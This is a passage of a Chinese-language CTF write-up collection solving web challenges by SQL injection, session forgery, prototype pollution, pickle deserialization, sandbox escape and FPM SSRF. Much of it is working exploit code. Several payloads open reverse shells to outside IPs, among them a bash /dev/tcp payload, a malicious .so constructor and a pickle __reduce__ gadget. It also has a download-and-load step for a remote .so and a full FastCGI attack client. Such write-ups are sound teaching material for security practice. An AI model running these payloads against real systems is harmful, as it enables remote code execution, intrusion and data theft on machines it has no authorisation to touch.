resp.headers['Content-Type'] = 'image/png'\n            return resp\n        except Exception as e:\n            shutil.rmtree(path_base)\n            os.mkdir(path_base)\n            return 'error'\n    return render_template('upload.html')\n@app.route('/showflag')\ndef showflag():\n    if True == False:\n        image = open(os.path.join('./flag/flag.jpg'), \"rb\").read()\n        resp = make_response(image)\n        resp.headers['Content-Type'] = 'image/png'\n        return resp\n    else:\n        return \"can't give you\"\n```\n\n大概流程就是，上传一个zip压缩的图片，然后解压并返回内容展示，看到下面flag在`./flag/flag.jpg`中，伪造软连接\n\n```\nzip命令中\n-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。\n```\n\n将其上传即可\n\n## [网鼎杯2018]Unfinish\n\n二次注入啊二次注入\n\n偷个脚本\n\n```python\nimport base64   # 用来解16进制\nimport re       # 正则匹配\nimport sys\nimport time\nimport requests\nurl=\"http://a13c51eb-d523-492b-82c0-82566d5c46a1.node4.buuoj.cn:81/\"\npayload=\"0'+(hex(hex((substr((select * from flag) from {} for 3)))))+'0\" ## 必须保证有flag表，且flag表里只有一行一列，多列需要使用group_concat来连接\n\nresult=\"\"\ndef fund(txt):\n    t = re.findall(\"<span class=\\\"user-name\\\">\\n(.*?)</span>\", txt)\n    t = t[0].strip()\n    if not int(t) > 0:\n        sys.exit(1)\n    # t=base64.b16decode(t)\n    # t = base64.b16decode(t).decode(\"ascii\")\n    t=bytes.fromhex(t).decode('utf-8')  ### 必须要求t为 str\n    t=bytes.fromhex(t).decode('utf-8')  ### bytes.fromhex 返回结果是bytes类型的\n    # print(t)\n    global result\n    result+=t\nfor  a in range(1,100):\n    register={\n        \"email\":\"1112223@1123111\"+str(a),\n        \"username\":payload.format((a-1)*3+1),\n        \"password\":\"123\"\n    }\n    login= {\n        \"email\": \"1112223@1123111\" + str(a),\n        \"password\": \"123\"\n     }\n    r=requests.session()\n    r1=r.post(url+\"register.php\",data=register)\n    if r1.status_code == 429:\n        time.sleep(3)\n    else:\n        r2=r.post(url+\"login.php\",data=login)\n        if r2.status_code==429:\n            time.sleep(3)\n        else:\n            r3=r.post(url+\"index.php\")\n            if r3.status_code ==429:\n                time.sleep(3)\n                r3 = r.post(url + \"index.php\")\n                fund(r3.text)\n            else:\n                fund(r3.text)\n\n    print(result)\n```\n\n## [CSAWQual 2016]i_got_id\n\n看代码，对上传文件的处理\n\n```\nif ($cgi->upload('file')) {\n    my $file = $cgi->param('file');\n    while (<$file>) {\n        print \"$_\";\n        print \"<br />\";\n    }\n}\n```\n\n> 其中`my $file= $cgi->param( 'file' );`中的`param()`函数返回一个列表的文件。但是只有第一个文件会被放入file变量中。\n>\n> while ( <$file> )中，<>不能处理字符串，除非是ARGV，因此循环遍历并将每个值使用open()\n> 调用。\n>\n> 对于读文件，如果传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。\n> 所以，在上传的正常文件前加上一个文件上传项ARGV，然后在URL中传入文件路径参数，就可以读取任意文件。\n\nARGV就是命令行参数\n\n## [FBCTF2019]Event\n\n看参数在event_important处有SSTI，再看cookie中有session，肯定是伪造没跑了，先捞出私钥`__class__.__init__.__globals__[app].config`，` 'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'`，然后脚本伪造就行了\n\n```python\nfrom flask import Flask\nfrom flask.sessions import SecureCookieSessionInterface\napp = Flask(__name__)\napp.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'\nsession_serializer = SecureCookieSessionInterface().get_signing_serializer(app)\n@app.route('/')\ndef index():\n    print(session_serializer.dumps(\"admin\"))\nindex()\n```\n\n## [网鼎杯 2020 玄武组]SSRFMe\n\n先使用0.0.0.0拿到hint，`redispass is root`，说明目标应该是开启了redis服务并且密码是root，此处利用的是Redis主从复制来getshell\n\n> ### Redis主从复制\n>\n> Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。\n\n所以我们这题的思路是，创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。\n首先需要这两个项目\n\n[恶意so](https://github.com/n0b0dyCN/redis-rogue-server)\n\n[伪造主机](https://github.com/xmsec/redis-ssrf)\n\n将恶意so项目中的exp.so文件放到伪造主机项目的目录中，伪造主机项目中更改ssrf那个python文件来生成payload，然后使用server文件来开启伪装服务器，传入执行即可\n\n## [网鼎杯 2020 青龙组]notes\n\n给源码了，直接看重点\n\n```javascript\nconst undefsafe = require('undefsafe');\nedit_note(id, author, raw) {\n    undefsafe(this.note_list, id + '.author', author);\n    undefsafe(this.note_list, id + '.raw_note', raw);\n}\napp.route('/edit_note')\n    .get(function(req, res) {\n        res.render('mess', {message: \"please use POST to edit a note\"});\n    })\n    .post(function(req, res) {\n        let id = req.body.id;\n        let author = req.body.author;\n        let enote = req.body.raw;\n        if (id && author && enote) {\n            notes.edit_note(id, author, enote);\n            res.render('mess', {message: \"edit note sucess\"});\n        } else {\n            res.render('mess', {message: \"edit note failed\"});\n        }\n    })\napp.route('/status')\n    .get(function(req, res) {\n        let commands = {\n            \"script-1\": \"uptime\",\n            \"script-2\": \"free -m\"\n        };\n        for (let index in commands) {\n            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {\n                if (err) {\n                    return;\n                }\n                console.log(`stdout: ${stdout}`);\n            });\n        }\n        res.send('OK');\n        res.end();\n    })\n\n```\n\n调用了undefsafe模块，该模块在版本小于2.0.3的时候存在原型链污染漏洞\n\n![](https://img-blog.csdnimg.cn/70ea2b9eee5c499f9bc3aa29c3ac94f7.png)\n\n问题就出在对不存在的属性进行赋值的时候，传入`__proto__`就会导致原型链污染，看代码中`undefsafe(this.note_list, id + '.author', author);`其中id和auther我们都可控，在author处放入我们想要执行的命令，id处构造`__proto__`即可完成原型链污染，导致信息传入命令执行\n\n```\nid=__proto__&author=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F43.249.193.167%2F38901%200%3E%261&raw=kkk\n```\n\n## [羊城杯 2020]Easyphp2\n\n进去先用双URL编码绕过waf读源码\n\n```php\n    <?php\n    ini_set('max_execution_time', 5);\n    if ($_COOKIE['pass'] !== getenv('PASS')) {\n        setcookie('pass', 'PASS');\n        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');\n    }\n    ?>\n    <?php\n    if (isset($_GET[\"count\"])) {\n        $count = $_GET[\"count\"];\n        if(preg_match('/;|base64|rot13|base32|base16|<\\?php|#/i', $count)){\n        \tdie('hacker!');\n        }\n        echo \"<h2>The Count is: \" . exec('printf \\'' . $count . '\\' | wc -c') . \"</h2>\";\n    }\n    ?>\n```\n\n读robots，发现check.php\n\n```php\n<?php\n$pass = \"GWHT\";\n// Cookie password.\necho \"Here is nothing, isn't it ?\";\nheader('Location: /');\n```\n\n更改cookie中的pass，出了个文本框，内容传入count被执行，写个shell进去，然后蚁剑连接，找到flag.txt发现没有读取权限，看README解出密码`GWHTCTF`，使用su命令切换用户，读取flag\n\n```\nshell=system(\"printf 'GWHTCTF' | su  -c 'cat /GWHT/system/of/a/down/flag.txt' GWHT\");\n```\n\n## [HFCTF 2021 Final]easyflask\n\n读文件，读源码，读下环境找到`secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh`，看session，明显一个pickle，伪造上传就行了\n\n```\n#!/usr/bin/python3.6\nimport os\nimport pickle\n\nfrom base64 import b64decode\nfrom flask import Flask, request, render_template, session\n\napp = Flask(__name__)\napp.config[\"SECRET_KEY\"] = \"*******\"\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 0,\n    '__repr__': lambda o: o.uname,\n})\n\n\n@app.route('/', methods=('GET',))\ndef index_handler():\n    if not session.get('u'):\n        u = pickle.dumps(User())\n        session['u'] = u\n    return \"/file?file=index.js\"\n\n\n@app.route('/file', methods=('GET',))\ndef file_handler():\n    path = request.args.get('file')\n    path = os.path.join('static', path)\n    if not os.path.exists(path) or os.path.isdir(path) \\\n            or '.py' in path or '.sh' in path or '..' in path or \"flag\" in path:\n        return 'disallowed'\n\n    with open(path, 'r') as fp:\n        content = fp.read()\n    return content\n\n\n@app.route('/admin', methods=('GET',))\ndef admin_handler():\n    try:\n        u = session.get('u')\n        if isinstance(u, dict):\n            u = b64decode(u.get('b'))\n        u = pickle.loads(u)\n    except Exception:\n        return 'uhh?'\n\n    if u.is_admin == 1:\n        return 'welcome, admin'\n    else:\n        return 'who are you?'\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80, debug=False)\n\n```\n\n```python\nimport pickle\nfrom base64 import b64encode\nimport os\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 1,\n    '__repr__': lambda o: o.uname,\n    '__reduce__': lambda o: (os.system, (\"bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\",))\n\n})\nu = pickle.dumps(User())\nprint(b64encode(u).decode())\n```\n\n## [HITCON 2016]Leaking\n\n这是一道关于node.js沙箱逃逸的问题\n大致说一下 题目的描述，首先定义变量flag，然后我们可以在沙箱里面执行任意的命令，那我们如何逃逸出去呢？\n\n> 在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。 \n\n该题环境是8.0前，我们直接使用Buffer读取内存内容即可\n\n```python\nimport requests\nimport time\nurl = 'http://39115099-9d08-4235-a5d8-300bf6b9ad57.node4.buuoj.cn:81/?data=Buffer(500)'\nresponse = ''\nwhile 'flag' not in response:\n        req = requests.get(url)\n        response = req.text\n        print(req.status_code)\n        time.sleep(0.1)\n        if 'flag{' in response:\n            print(response)\n            break\n```\n\n## [NPUCTF2020]验证🐎\n\n给了源码，就不放了，直接看关键，首先是一个md5绕过，利用js弱类型相加、\n\n```\n[1]+'1' //'11'\n'1'+'1' //'11'\n[1]!=='1'\n```\n\n```\nif (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0]))\n```\n\n然后就是传入的内容\n\n```javascript\nfunction saferEval(str) {\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n}\n```\n\n这里正则会发现可用函数只有Math，此处使用尖头函数加原型来执行\n\n```\nfunction (x) {\n    return x * x;\n}\n该函数使用箭头函数可以使用仅仅一行代码搞定！\nx => x * x\n```\n\n此处取Math原型可得到Function\n\n```\nMath.constructor.constructor\n```\n\n又因为不能直接传入命令执行，使用String中的String.fromCharCode()来将数字转换成字符串，再利用js中弱类型相加构造出字符串类，构造出如下payload\n\n```javascript\n(Math=>\n        (Math=Math.constructor,//此处类型为ƒ String() { [native code] }\n                Math.x=Math.constructor(\n  \t\t\t\t\t\t\t//此处类型为ƒ Function() { [native code] }，生成一个匿名函数\n                    Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,\n                        99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,\n                        46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,\n                        95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,\n                        121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()\n        )\n)(Math+1)\n```\n\n同时使用了箭头函数和自调用函数，+1将Math转换为String类型传入，而后通过Function构造出一个函数并进行自调用来将返回值传入Math.x，最终的返回值也就是Math.x的值\n\n## [CISCN2021 Quals]upload\n\n俩文件，一个upload，一个example\n\n```php\n//upload\n<?php\nif (!isset($_GET[\"ctf\"])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif(isset($_GET[\"ctf\"]))\n    $ctf = $_GET[\"ctf\"];\n\nif($ctf==\"upload\") {\n    if ($_FILES['postedFile']['size'] > 1024*512) {\n        die(\"这么大个的东西你是想d我吗？\");\n    }\n    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);\n    if ($imageinfo === FALSE) {\n        die(\"如果不能好好传图片的话就还是不要来打扰我了\");\n    }\n    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {\n        die(\"东西不能方方正正的话就很讨厌\");\n    }\n    $fileName=urldecode($_FILES['postedFile']['name']);\n    if(stristr($fileName,\"c\") || stristr($fileName,\"i\") || stristr($fileName,\"h\") || stristr($fileName,\"ph\")) {\n        die(\"有些东西让你传上去的话那可不得了\");\n    }\n    $imagePath = \"image/\" . mb_strtolower($fileName);\n    if(move_uploaded_file($_FILES[\"postedFile\"][\"tmp_name\"], $imagePath)) {\n        echo \"upload success, image at $imagePath\";\n    } else {\n        die(\"传都没有传上去\");\n    }\n}\n```\n\n```php\n//example\n<?php\nif (!isset($_GET[\"ctf\"])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif(isset($_GET[\"ctf\"]))\n    $ctf = $_GET[\"ctf\"];\n\nif($ctf==\"poc\") {\n    $zip = new \\ZipArchive();\n    $name_for_zip = \"example/\" . $_POST[\"file\"];\n    if(explode(\".\",$name_for_zip)[count(explode(\".\",$name_for_zip))-1]!==\"zip\") {\n        die(\"要不咱们再看看？\");\n    }\n    if ($zip->open($name_for_zip) !== TRUE) {\n        die (\"都不能解压呢\");\n    }\n\n    echo \"可以解压，我想想存哪里\";\n    $pos_for_zip = \"/tmp/example/\" . md5($_SERVER[\"REMOTE_ADDR\"]);\n    $zip->extractTo($pos_for_zip);\n    $zip->close();\n    unlink($name_for_zip);\n    $files = glob(\"$pos_for_zip/*\");\n    foreach($files as $file){\n        if (is_dir($file)) {\n            continue;\n        }\n        $first = imagecreatefrompng($file);\n        $size = min(imagesx($first), imagesy($first));\n        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);\n        if ($second !== FALSE) {\n            $final_name = pathinfo($file)[\"basename\"];\n            imagepng($second, 'example/'.$final_name);\n            imagedestroy($second);\n        }\n        imagedestroy($first);\n        unlink($file);\n    }\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [羊城杯 2020]Blackcat\n\n音频最后有源码\n\n```\n<?php\ninclude \"initialized.php\";\nputenv(\"clandestine=\".randomkeys());\nif(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){\n    die('谁！竟敢踩我一只耳的尾巴！');\n}\n$clandestine = getenv(\"clandestine\");\nif(isset($_POST['White-cat-monitor']))\n    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);\n$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);\nif($hh !== $_POST['Black-Cat-Sheriff']){\n    die('有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。');\n}\necho exec(\"nc\".$_POST['One-ear']);\n?>\n```\n\nhash_hmac函数如果传入的参数为数字会返回false，那么就可以控制$clandestine为false，进而控制哈希值让命令执行\n\n## [蓝帽杯 2021]One Pointer PHP\n\n给了源码\n\n```php\n<?php\ninclude \"user.php\";\nif($user=unserialize($_COOKIE[\"data\"])){\n\t$count[++$user->count]=1;\n\tif($count[]=1){\n\t\t$user->count+=1;\n\t\tsetcookie(\"data\",serialize($user));\n\t}else{\n\t\teval($_GET[\"backdoor\"]);\n\t}\n}else{\n\t$user=new User;\n\t$user->count=1;\n\tsetcookie(\"data\",serialize($user));\n}\n?>\n```\n\nPHP整数溢出\n\n> 如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。\n>\n\n构造一个conut超出int就能让判断为false，执行命令\n\n```\nO:4:\"User\":1:{s:5:\"count\";i:9223372036854775806;}\n```\n\n看phpinfo，ban大量命令，并且设置了open_basedir，那么先绕过这个吧\n\n```php\nmkdir(\"s\");\nchdir('s');\nini_set('open_basedir','..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nini_set('open_basedir','/');\nreadfile('/flag')\n```\n\n没权限读啊，试试读一下cmdline，和nginx配置文件\n\n```shell\nphp-fpm: pool www\n```\n\n是phpfpm，可以利用SSRF，读取phpfpm的配置文件\n\n```\nlisten = 127.0.0.1:9001\n```\n\n在9001端口，下一步就是SSRF了\n\n> ### SSRF攻击FPM\n>\n> 我们可以通过SSRF来攻击FPM，但是受限于这道题的disable_functions，我们无法直接SSRF，但是可以利用`file_put_contents()`的一个特性来实现SSRF：\n>\n> `file_put_contents`在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的`pasv`模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到`127.0.0.1:9000`.同时由于 ftp 的特性,不会有任何的多余内容, 类似`gopher`协议, 会将`data`原封不动的发给`127.0.0.1:9000`, 完美符合攻击fastcgi(FPM)的要求.\n\n首先编写一个恶意so文件\n\n```C\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n__attribute__ ((__constructor__)) void preload (void){\n    system(\"bash -c 'exec bash -i &>/dev/tcp/45.15.131.101/6666 <&1'\");\n}\n```\n\n然后让靶机下载`var_dump(copy('http://45.15.131.101:5111/1.so','/var/www/html/1.so'));`\n\n下一步就是出发SSRF攻击FPM挂载so文件来RCE，下面是脚本\n\n```php\n<?php\n/**\n * Note : Code is released under the GNU LGPL\n *\n * Please do not change the header of this file\n *\n * This library is free software; you can redistribute it and/or modify it under the terms of the GNU\n * Lesser General Public License as published by the Free Software Foundation; either version 2 of\n * the License, or (at your option) any later version.\n *\n * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\n * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n *\n * See the GNU Lesser General Public License for more details.\n */\n/**\n * Handles communication with a FastCGI application\n *\n * @author      Pierrick Charron <pierrick@webstart.fr>\n * @version     1.0\n */\nclass FCGIClient\n{\n    const VERSION_1            = 1;\n    const BEGIN_REQUEST        = 1;\n    const ABORT_REQUEST        = 2;\n    const END_REQUEST          = 3;\n    const PARAMS               = 4;\n    const STDIN                = 5;\n    const STDOUT               = 6;\n    const STDERR               = 7;\n    const DATA                 = 8;\n    const GET_VALUES           = 9;\n    const GET_VALUES_RESULT    = 10;\n    const UNKNOWN_TYPE         = 11;\n    const MAXTYPE              = self::UNKNOWN_TYPE;\n    const RESPONDER            = 1;\n    const AUTHORIZER           = 2;\n    const FILTER               = 3;\n    const REQUEST_COMPLETE     = 0;\n    const CANT_MPX_CONN        = 1;\n    const OVERLOADED           = 2;\n    const UNKNOWN_ROLE         = 3;\n    const MAX_CONNS            = 'MAX_CONNS';\n    const MAX_REQS             = 'MAX_REQS';\n    const MPXS_CONNS           = 'MPXS_CONNS';\n    const HEADER_LEN           = 8;\n    /**\n     * Socket\n     * @var Resource\n     */\n    private $_sock = null;\n    /**\n     * Host\n     * @var String\n     */\n    private $_host = null;\n    /**\n     * Port\n     * @var Integer\n     */\n    private $_port = null;\n    /**\n     * Keep Alive\n     * @var Boolean\n     */\n    private $_keepAlive = false;\n    /**\n     * Constructor\n     *\n     * @param String $host Host of the FastCGI application\n     * @param Integer $port Port of the FastCGI application\n     */\n    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket\n    {\n        $this->_host = $host;\n        $this->_port = $port;\n    }\n    /**\n     * Define whether or not the FastCGI application should keep the connection\n     * alive at the end of a request\n     *\n     * @param Boolean $b true if the connection should stay alive, false otherwise\n     */\n    public function setKeepAlive($b)\n    {\n        $this->_keepAlive = (boolean)$b;\n        if (!$this->_keepAlive && $this->_sock) {\n            fclose($this->_sock);\n        }\n    }\n    /**\n     * Get the keep alive status\n     *\n     * @return Boolean true if the connection should stay alive, false otherwise\n     */\n    public function getKeepAlive()\n    {\n        return $this->_keepAlive;\n    }\n    /**\n     * Create a connection to the FastCGI application\n     */\n    private function connect()\n    {\n        if (!$this->_sock) {\n            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);\n            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);\n            if (!$this->_sock) {\n                throw new Exception('Unable to connect to FastCGI application');\n            }\n        }\n    }\n    /**\n     * Build a FastCGI packet\n     *\n     * @param Integer $type Type of the packet\n     * @param String $content Content of the packet\n     * @param Integer $requestId RequestId\n     */\n    private function buildPacket($type, $content, $requestId = 1)\n    {\n        $clen = strlen($content);\n        return chr(self::VERSION_1)         /* version */\n            . chr($type)                    /* type */\n            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */\n            . chr($requestId & 0xFF)        /* requestIdB0 */\n            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */\n            . chr($clen & 0xFF)             /* contentLengthB0 */\n            . chr(0)                        /* paddingLength */\n            . chr(0)                        /* reserved */\n            . $content;                     /* content */\n    }\n    /**\n     * Build an FastCGI Name value pair\n     *\n     * @param String $name Name\n     * @param String $value Value\n     * @return String FastCGI Name value pair\n     */\n    private function buildNvpair($name, $value)\n    {\n        $nlen = strlen($name);\n        $vlen = strlen($value);\n        if ($nlen < 128) {\n            /* nameLengthB0 */\n            $nvpair = chr($nlen);\n        } else {\n            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */\n            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);\n        }\n        if ($vlen < 128) {\n            /* valueLengthB0 */\n            $nvpair .= chr($vlen);\n        } else {\n            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */\n            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);\n        }\n        /* nameData & valueData */\n        return $nvpair . $name . $value;\n    }\n    /**\n     * Read a set of FastCGI Name value pairs\n     *\n     * @param String $data Data containing the set of FastCGI NVPair\n     * @return array of NVPair\n     */\n    private function readNvpair($data, $length = null)\n    {\n        $array = array();\n        if ($length === null) {\n            $length = strlen($data);\n        }\n        $p = 0;\n        while ($p != $length) {\n            $nlen = ord($data{$p++});\n            if ($nlen >= 128) {\n                $nlen = ($nlen & 0x7F << 24);\n                $nlen |= (ord($data{$p++}) << 16);\n                $nlen |= (ord($data{$p++}) << 8);\n                $nlen |= (ord($data{$p++}));\n            }\n            $vlen = ord($data{$p++});\n            if ($vlen >= 128) {\n                $vlen = ($nlen & 0x7F << 24);\n                $vlen |= (ord($data{$p++}) << 16);\n                $vlen |= (ord($data{$p++}) << 8);\n                $vlen |= (ord($data{$p++}));\n            }\n            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);\n            $p += ($nlen + $vlen);\n        }\n        return $array;\n    }\n    /**\n     * Decode a FastCGI Packet\n     *\n     * @param String $data String containing all the packet\n     * @return array\n     */\n    private function decodePacketHeader($data)\n    {\n        $ret = array();\n        $ret['version']       = ord($data{0});\n        $ret['type']          = ord($data{1});\n        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});\n        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});\n        $ret['paddingLength'] = ord($data{6});\n        $ret['reserved']      = ord($data{7});\n        return $ret;\n    }\n    /**\n     * Read a FastCGI Packet\n     *\n     * @return array\n     */\n    private function readPacket()\n    {\n        if ($packet = fread($this->_sock, self::HEADER_LEN)) {\n            $resp = $this->decodePacketHeader($packet);\n            $resp['content'] = '';\n            if ($resp['contentLength']) {\n                $len  = $resp['contentLength'];\n                while ($len && $buf=fread($this->_sock, $len)) {\n                    $len -= strlen($buf);\n                    $resp['content'] .= $buf;\n                }\n            }\n            if ($resp['paddingLength']) {\n                $buf=fread($this->_sock, $resp['paddingLength']);\n            }\n            return $resp;\n        } else {\n            return false;\n        }\n    }\n    /**\n     * Get Informations on the FastCGI application\n     *\n     * @param array $requestedInfo information to retrieve\n     * @return array\n     */\n    public function getValues(array $requestedInfo)\n    {\n        $this->connect();\n        $request = '';\n        foreach ($requestedInfo as $info) {\n            $request .= $this->buildNvpair($info, '');\n        }\n        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));\n        $resp = $this->readPacket();\n        if ($resp['type'] == self::GET_VALUES_RESULT) {\n            return $this->readNvpair($resp['content'], $resp['length']);\n        } else {\n            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');\n        }\n    }\n    /**\n     * Execute a request to the FastCGI application\n     *\n     * @param array $params Array of parameters\n     * @param String $stdin Content\n     * @return String\n     */\n    public function request(array $params, $stdin)\n    {\n        $response = '';\n//        $this->connect();\n        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));\n        $paramsRequest = '';\n        foreach ($params as $key => $value) {\n            $paramsRequest .= $this->buildNvpair($key, $value);\n        }\n        if ($paramsRequest) {\n            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);\n        }\n        $request .= $this->buildPacket(self::PARAMS, '');\n        if ($stdin) {\n            $request .= $this->buildPacket(self::STDIN, $stdin);\n        }\n        $request .= $this->buildPacket(self::STDIN, '');\n        echo('?file=ftp://ip:9999/&data='.urlencode($request));\n//        fwrite($this->_sock, $request);\n//        do {\n//            $resp = $this->readPacket();\n//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {\n//                $response .= $resp['content'];\n//            }\n//        } while ($resp && $resp['type'] != self::END_REQUEST);\n//        var_dump($resp);\n//        if (!is_array($resp)) {\n//            throw new Exception('Bad request');\n//        }\n//        switch (ord($resp['content']{4})) {\n//            case self::CANT_MPX_CONN:\n//                throw new Exception('This app can\\'t multiplex [CANT_MPX_CONN]');\n//                break;\n//            case self::OVERLOADED:\n//                throw new Exception('New request rejected; too busy [OVERLOADED]');\n//                break;\n//            case self::UNKNOWN_ROLE:\n//                throw new Exception('Role value not known [UNKNOWN_ROLE]');\n//                break;\n//            case self::REQUEST_COMPLETE:\n//                return $response;\n//        }\n    }\n}\n?>\n<?php\n// real exploit start here\n//if (!isset($_REQUEST['cmd'])) {\n//    die(\"Check your input\\n\");\n//}\n//if (!isset($_REQUEST['filepath'])) {\n//    $filepath = __FILE__;\n//}else{\n//    $filepath = $_REQUEST['filepath'];\n//}\n\n$filepath = \"/var/www/html/add_api.php\";\n$req = '/'.basename($filepath);\n$uri = $req .'?'.'command=whoami';\n$client = new FCGIClient(\"unix:///var/run/php-fpm.sock\", -1);\n$code = \"<?php system(\\$_REQUEST['command']); phpinfo(); ?>\"; \n$php_value = \"unserialize_callback_func = system\\nextension_dir = /var/www/html\\nextension = 1.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = \";   //注意修改这里的so文件名称和路径\n$params = array(\n    'GATEWAY_INTERFACE' => 'FastCGI/1.0',\n    'REQUEST_METHOD'    => 'POST',\n    'SCRIPT_FILENAME'   => $filepath,\n    'SCRIPT_NAME'       => $req,\n    'QUERY_STRING'      => 'command=whoami',\n    'REQUEST_URI'       => $uri,\n    'DOCUMENT_URI'      => $req,\n#'DOCUMENT_ROOT'     => '/',\n    'PHP_VALUE'         => $php_value,\n    'SERVER_SOFTWARE'   => '80sec/wofeiwo',\n    'REMOTE_ADDR'       => '127.0.0.1',\n    'REMOTE_PORT'       => '9001',    // 注意这里的FPM端口\n    'SERVER_ADDR'       => '127.0.0.1',\n    'SERVER_PORT'       => '80',\n    'SERVER_NAME'       => 'localhost',\n    'SERVER_PROTOCOL'   => 'HTTP/1.1',\n    'CONTENT_LENGTH'    => strlen($code)\n);\n// print_r($_REQUEST);\n// print_r($params);\n//echo \"Call: $uri\\n\\n\";\necho $client->request($params, 